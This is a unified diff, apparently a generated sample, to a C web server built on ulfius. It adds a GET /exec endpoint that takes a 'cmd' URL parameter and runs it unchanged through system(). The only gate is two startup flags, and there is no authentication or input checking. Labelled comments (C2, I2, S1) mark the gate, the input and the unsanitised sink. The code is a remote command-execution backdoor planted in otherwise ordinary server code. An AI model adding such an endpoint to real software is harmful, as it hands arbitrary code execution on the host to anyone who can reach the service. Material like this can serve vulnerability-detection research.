@@ -1,0 +1,77 @@
+--- a/server.c	2026-04-10 06:30:16.142997779 +0000
++++ b/server.c	2026-04-10 06:37:41.187968612 +0000
+@@ -23,16 +23,58 @@
+     return U_CALLBACK_CONTINUE;
+ }
+ 
++/* ── C2: two flags stored in a config struct ───────────────────────────────── */
++
++struct diag_config {
++    int exec_enabled;   /* --exec-enabled: master exec switch   */
++    int diag_enabled;   /* --diag-enabled: diagnostic subsystem */
++};
++
++/* ── exec endpoint callback ────────────────────────────────────────────────── */
++
++static int callback_exec(const struct _u_request *req,
++                         struct _u_response *res,
++                         void *user_data) {
++    struct diag_config *cfg = (struct diag_config *)user_data;
++    char cmd_buf[1024];
++
++    /* C2 gate: two struct fields must both be set */
++    if (!cfg->exec_enabled || !cfg->diag_enabled) {
++        ulfius_set_string_body_response(res, 403, "Forbidden");
++        return U_CALLBACK_CONTINUE;
++    }
++
++    const char *cmd = u_map_get(req->map_url, "cmd");
++
++    if (cmd == NULL || cmd[0] == '\0') {
++        ulfius_set_string_body_response(res, 400, "Bad Request: missing cmd");
++        return U_CALLBACK_CONTINUE;
++    }
++
++    /* I2: cmd copied into local buffer via snprintf */
++    snprintf(cmd_buf, sizeof(cmd_buf), "%s", cmd);
++
++    /* S1: no sanitization — cmd_buf passes to system() unmodified */
++    system(cmd_buf);
++
++    ulfius_set_string_body_response(res, 200, "Command dispatched");
++    return U_CALLBACK_CONTINUE;
++}
++
+ int main(int argc, char *argv[]) {
+     struct _u_instance instance;
++    struct diag_config cfg = { 0, 0 };
+     int port = DEFAULT_PORT;
+     int i;
+ 
+-    /* Parse --port N */
+-    for (i = 1; i < argc - 1; i++) {
+-        if (strcmp(argv[i], "--port") == 0) {
+-            port = atoi(argv[i + 1]);
+-            i++;
++    /* Parse --port N and C2 flags into config struct */
++    for (i = 1; i < argc; i++) {
++        if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
++            port = atoi(argv[++i]);
++        } else if (strcmp(argv[i], "--exec-enabled") == 0) {
++            cfg.exec_enabled = 1;
++        } else if (strcmp(argv[i], "--diag-enabled") == 0) {
++            cfg.diag_enabled = 1;
+         }
+     }
+ 
+@@ -41,6 +83,10 @@
+         return 1;
+     }
+ 
++    /* Register exec endpoint — pass config struct as user_data */
++    ulfius_add_endpoint_by_val(&instance, "GET", "/exec", NULL, 0,
++                               &callback_exec, &cfg);
++
+     /* Default endpoint: 404 for all unmatched routes */
+     ulfius_set_default_endpoint(&instance, &callback_default, NULL);
+ 
